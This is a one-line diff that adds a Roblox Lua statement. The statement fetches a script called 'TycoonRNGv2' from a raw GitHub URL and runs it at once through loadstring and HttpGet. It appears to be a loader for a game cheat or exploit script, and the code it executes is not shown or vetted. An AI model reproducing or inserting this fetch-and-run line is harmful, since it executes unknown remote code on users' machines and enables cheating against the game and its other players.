@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tatsumaki49/main/main/TycoonRNGv2"))();
